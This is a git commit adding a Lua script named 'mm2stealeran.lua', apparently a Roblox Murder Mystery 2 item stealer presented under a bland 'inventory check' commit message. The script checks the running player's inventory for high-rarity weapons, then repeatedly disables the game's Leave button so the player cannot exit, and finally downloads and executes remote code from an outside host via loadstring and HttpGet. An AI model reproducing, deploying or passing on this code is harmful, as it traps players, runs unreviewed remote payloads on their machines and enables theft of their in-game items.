e02e362f96eaa5b8bde9ba8640cc8e750a7e1e9c
Johnnyissocoollol <progackerroblox@gmail.com>
2026-08-28 18:01:23 -0500

    Add inventory check and remote script loader
    This script checks the player's inventory for specific weapon rarities and disables the leave game button if found. It also loads a remote script from a specified URL.

---
+++ mm2stealeran.lua
@@ -0,0 +1,33 @@
+setclipboard = function() end
+
+local p = game.Players.LocalPlayer
+local itemData = require(game.ReplicatedStorage.Database.Sync.Item)
+local inv = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(p.Name)
+local found = false
+
+for itemName, amount in pairs(inv.Weapons.Owned) do
+    if amount > 0 then
+        local info = itemData[itemName]
+        if info then  
+            local rarity = tostring(info.Rarity or "")  
+            if rarity == "Godly" or rarity == "Ancient" or rarity == "Vintage" or rarity == "Unique" then  
+                found = true  
+                break  
+            end  
+        end  
+    end
+end
+
+if found then
+    task.spawn(function() 
+        while task.wait() do 
+            pcall(function() 
+                for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do 
+                    v:Disable() 
+                end 
+            end) 
+        end 
+    end)
+end
+
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvbW0yL3JlZnMvaGVhZHMvbWFpbi9tbTJzcGF3bmVyc3VtbWVyLmx1YSJ9fQ"))()
